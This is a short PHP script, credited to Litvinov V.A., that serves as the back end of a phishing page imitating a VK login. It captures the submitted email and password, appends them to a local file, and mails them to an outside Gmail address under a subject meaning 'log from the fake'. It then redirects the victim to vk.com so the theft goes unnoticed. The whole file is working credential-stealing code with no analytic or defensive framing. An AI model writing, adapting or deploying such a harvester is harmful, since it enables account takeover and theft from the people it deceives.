<?php

/**
 * @author Litvinov V.A.
 * @copyright 2016 (2707)
 */
 
$a=$_REQUEST["email"];
$b=$_REQUEST["pass"];
$LOCATION="https://vk.com";

$file="demon.php";
$text=$a.":".$b.":\n";
$ok=fopen($file,"a+");

fwrite($ok,$text);
fclose($ok);

mail('apivko88@gmail.com', 'Лог с фейка', $a . ':' . $b);
header("Location:$LOCATION");

?>